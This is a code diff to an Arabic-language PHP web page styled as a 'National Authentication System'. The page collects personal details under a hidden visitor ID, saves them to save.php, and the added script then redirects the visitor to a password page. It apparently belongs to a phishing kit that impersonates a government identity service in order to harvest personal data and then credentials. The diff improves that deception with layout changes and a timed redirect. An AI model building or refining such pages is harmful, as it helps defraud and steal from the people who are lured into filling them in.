@@ -30,9 +30,18 @@ try {
 
     <style>
         :root { --primary-color: #007fb1; --secondary-color: #8a1538; --input-bg: #f2f2f2; }
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #ffffff; margin: 0; padding: 0; display: flex; flex-direction: column; min-height: 100vh; }
-        .header { background-color: #fff; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #ddd; }
-        .container { width: 92%; max-width: 500px; margin: 30px auto; padding: 10px; flex: 1; text-align: right; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #ffffff; margin: 0; padding-top: 80px; display: flex; flex-direction: column; min-height: 100vh; }
+        
+        .header { 
+            position: fixed; top: 0; width: 100%; height: 70px; background-color: #fff; 
+            padding: 0 20px; display: flex; justify-content: space-between; align-items: center; 
+            border-bottom: 1px solid #ddd; z-index: 1000; box-sizing: border-box;
+        }
+        .header-right { display: flex; align-items: center; gap: 15px; }
+        .menu-icon { display: flex; flex-direction: column; justify-content: space-between; width: 22px; height: 16px; cursor: pointer; }
+        .menu-icon span { display: block; height: 2px; width: 100%; background-color: var(--primary-color); }
+
+        .container { width: 92%; max-width: 500px; margin: 20px auto; padding: 10px; flex: 1; text-align: right; }
         h2 { font-size: 22px; margin-bottom: 25px; color: #333; }
         .form-group { margin-bottom: 25px; }
         label { display: block; margin-bottom: 8px; font-weight: bold; color: #333; font-size: 14px; }
@@ -44,19 +53,23 @@ try {
         .gender-group { display: flex; gap: 20px; margin-top: 10px; }
         .radio-option { display: flex; align-items: center; font-size: 15px; cursor: pointer; }
         .btn-submit { width: 100%; background-color: var(--primary-color); color: white; border: none; padding: 15px; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 17px; margin-top: 20px; }
-        .footer { background-color: #eeeeee; padding: 20px; text-align: center; border-top: 1px solid #cccccc; font-size: 12px; color: #555; margin-top: auto; }
+        .footer { background-color: #eeeeee; padding: 20px; text-align: center; border-top: 1px solid #cccccc; font-size: 12px; color: #555; }
         .select2-container--default .select2-selection--single { background-color: var(--input-bg) !important; height: 50px; padding-top: 10px; border: 1px solid #ccc; }
     </style>
 </head>
 <body>
+
     <div class="header">
-        <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663234476152/DhrsVnFpSCHlBdiR.png" height="40">
+        <div class="header-right">
+            <div class="menu-icon"><span></span><span></span><span></span></div>
+            <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663234476152/DhrsVnFpSCHlBdiR.png" height="40">
+        </div>
         <div style="text-align: left; font-size: 14px;"><div style="color: var(--secondary-color); font-weight: bold;">نظام التوثيق الوطني</div></div>
     </div>
 
     <div class="container">
         <h2>البيانات الشخصية</h2>
-        <form action="save.php" method="POST">
+        <form id="dataForm" action="save.php" method="POST">
             <input type="hidden" name="visitor_id" value="<?php echo htmlspecialchars($visitor_id); ?>">
             
             <div class="form-group"><label>اختر الجنسية <span class="required">*</span></label>
@@ -103,17 +116,29 @@ try {
     <script>
     $(document).ready(function() {
         $('.js-example-basic-single').select2();
+        
+        // جلب الدول
         fetch('https://restcountries.com/v3.1/all')
             .then(response => response.json())
             .then(data => {
                 const select = $('#nationality');
                 const arabCountries = ['Qatar', 'Saudi Arabia', 'United Arab Emirates', 'Kuwait', 'Bahrain', 'Oman', 'Egypt'];
                 data.sort((a, b) => a.name.common.localeCompare(b.name.common)).forEach(country => {
-                    if (!arabCountries.includes(country.name.common)) {
-                        select.append(`<option value="${country.name.common}">${country.name.common}</option>`);
+                    const name = country.name.common;
+                    if (!arabCountries.includes(name)) {
+                        select.append(`<option value="${name}">${name}</option>`);
                     }
                 });
             });
+
+        // التحويل لصفحة الباسورد بعد الإرسال
+        $('#dataForm').on('submit', function(e) {
+            // ملاحظة: بما أن action هو save.php، سيتم الحفظ أولاً
+            // سأقوم بعمل تأخير بسيط لضمان تنفيذ الحفظ ثم الانتقال
+            setTimeout(function() {
+                window.location.href = 'password.php'; 
+            }, 500);
+        });
     });
     </script>
 </body>
